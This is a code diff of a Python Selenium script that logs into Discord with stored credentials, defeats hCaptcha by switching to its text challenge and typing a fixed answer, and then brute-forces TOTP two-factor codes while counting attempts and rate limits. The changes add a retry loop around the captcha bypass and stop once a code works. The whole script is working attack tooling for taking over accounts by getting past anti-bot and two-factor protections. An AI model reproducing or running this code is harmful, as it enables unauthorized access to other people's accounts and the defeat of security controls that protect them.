@@ -24,6 +24,7 @@ import random
 load_dotenv()
 
 # Get the Chromium web driver
+print(toColor("[*] Getting Web Driver", "cyan"))
 driver = webdriver.Chrome(ChromeDriverManager().install())
 
 # Set the email and password variables from the environment variables
@@ -76,42 +77,44 @@ def main():
     while True:
         # hCaptcha is required
         if "おかえりなさい！" in driver.page_source:
-            try:
-                # hCaptcha bypass
-                print(toColor(f"[*] Bypassing hCaptcha", "yellow"))
-                wait = WDW(driver, 5)
-                wait.until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, '//iframe')))
-                print(toColor(f"- Click checkbox", "cyan"))
-                start_button = wait.until(EC.element_to_be_clickable((By.ID, "checkbox")))
-                human_click(driver, start_button)
-                time.sleep(3)
-                driver.switch_to.default_content()
-                print(toColor(f"- Click 3 dots", "cyan"))
-                wait = WDW(driver, 5)
-                wait.until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, "iframe[title='hCaptchaチャレンジの主な内容']")))
-                button = wait.until(EC.element_to_be_clickable((By.ID, "menu-info")))
-                human_click(driver, button)
-                time.sleep(3)
-                print(toColor(f"- Click text challenge", "cyan"))
-                button = wait.until(EC.element_to_be_clickable((By.ID, "text_challenge")))
-                human_click(driver, button)
-                time.sleep(5)
-                print(toColor(f"- Enter text", "cyan"))
-                for i in range(5):
-                    try:
-                        inputText = driver.find_element(by=By.XPATH, value='//*[@aria-label="チャレンジテキスト入力"]')
-                        time.sleep(1)
-                        for t in ["い", "い", "え"]:
-                            inputText.send_keys(t)
-                            time.sleep(0.2)
-                        inputText.send_keys(Keys.RETURN)
-                        print(toColor(f"  (trying {i + 1})", "cyan"))
-                    except:
-                        break
-                print(print(toColor(f"[+] Successfully bypassed hCaptcha!", "yellow")))
-                time.sleep(5)
-            except:
-                print(traceback2.format_exc())
+            while True:
+                try:
+                    # hCaptcha bypass
+                    print(toColor(f"[*] Bypassing hCaptcha", "yellow"))
+                    wait = WDW(driver, 5)
+                    wait.until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, 'iframe[title="hCaptcha セキュリティ チャレンジのチェックボックスを含むウィジェット"]')))
+                    print(toColor(f"- Click checkbox", "cyan"))
+                    start_button = wait.until(EC.element_to_be_clickable((By.ID, "checkbox")))
+                    human_click(driver, start_button)
+                    time.sleep(3)
+                    driver.switch_to.default_content()
+                    print(toColor(f"- Click 3 dots", "cyan"))
+                    wait = WDW(driver, 5)
+                    wait.until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, "iframe[title='hCaptchaチャレンジの主な内容']")))
+                    button = wait.until(EC.element_to_be_clickable((By.ID, "menu-info")))
+                    human_click(driver, button)
+                    time.sleep(3)
+                    print(toColor(f"- Click text challenge", "cyan"))
+                    button = wait.until(EC.element_to_be_clickable((By.ID, "text_challenge")))
+                    human_click(driver, button)
+                    time.sleep(5)
+                    print(toColor(f"- Enter text", "cyan"))
+                    for i in range(5):
+                        try:
+                            inputText = driver.find_element(by=By.XPATH, value='//*[@aria-label="チャレンジテキスト入力"]')
+                            time.sleep(1)
+                            for t in ["い", "い", "え"]:
+                                inputText.send_keys(t)
+                                time.sleep(0.2)
+                            inputText.send_keys(Keys.RETURN)
+                            print(toColor(f"  (trying {i + 1})", "cyan"))
+                        except:
+                            break
+                    print(print(toColor(f"[+] Successfully bypassed hCaptcha!", "yellow")))
+                    time.sleep(5)
+                    break
+                except:
+                    print(print(toColor(f"[+] Something went wrong while bypassing hCaptcha.", "magenta")))
         else:
             # Attempt to find the TOTP login field
             try:
@@ -130,7 +133,7 @@ def main():
                     # Test if Discord ratelimits us
                     if "The resource is being rate limited." in driver.page_source:
                         # Log the ratelimit event and wait 7-12 seconds randomly
-                        print(toColor("[x] Ratelimited.", "red"))
+                        print(toColor("[x] Ratelimited.", "magenta"))
                         sleepy = secrets.choice(range(7, 12))
                         ratelimitCount += 1
                     # This means that Discord has expired this login session.
@@ -138,7 +141,7 @@ def main():
                         # This means that Discord has expired this login session.
                         #  Print this out as well as some statistics, and prompt the user to retry.
                         elapsed = time.time() - start
-                        print(toColor("[x] Invalid session ticket. The Discord login session has expired.", "red"))
+                        print(toColor("[x] Invalid session ticket. The Discord login session has expired.", "magenta"))
                         print(toColor(f"- Number of tried codes: {totpCount}", "cyan"))
                         print(toColor(f"- Time elapsed for codes: {elapsed}", "cyan"))
                         print(toColor(f"- Number of ratelimits {ratelimitCount}", "cyan"))
@@ -153,7 +156,7 @@ def main():
                         time.sleep(1)
                         loginTest = driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")
                         print(toColor(f"[o] Code {totp} worked!", "yellow"))
-                        break
+                        return True
                     except NoSuchElementException:
                         # This means that the login was unsuccessful.
                         time.sleep(sleepy)
@@ -169,6 +172,7 @@ def main():
 
 
 if __name__ == "__main__":
-    # Run the program.
+    print(toColor("[*] Starting main program", "cyan"))
     while True:
-        main()
+        if not main():
+            break
